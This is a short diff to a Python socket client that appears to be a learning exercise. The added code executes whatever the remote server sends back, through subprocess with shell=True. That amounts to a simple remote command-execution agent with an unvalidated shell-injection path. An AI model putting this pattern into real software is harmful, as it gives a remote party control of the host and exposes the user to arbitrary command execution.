@@ -1,5 +1,5 @@
 import socket
-import sys
+import subprocess
 # https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example
 
 def send_data(sock) :
@@ -17,6 +17,8 @@ def send_data(sock) :
             try : # Get data back from server
                 res = sock.recv(1024).decode('utf-8')
                 print(f'Server response : {res}')
+                command = res.split(' ')
+                exec_command(command)
             except socket.timeout:
                 print("Timeout, no response from server")
                 break
@@ -25,6 +27,15 @@ def send_data(sock) :
     finally:
         sock.close()
 
+# example : command = ['powershell', 'start', 'brave', 'www.google.ca']
+def exec_command(command):
+    # Shell=True : features such as shell pipes, filename wildcards, environment variable expansion
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+    if result.stdout:
+        print(result.stdout)
+    if result.stderr:
+        print(result.stderr)
 
 
 if __name__ == '__main__':
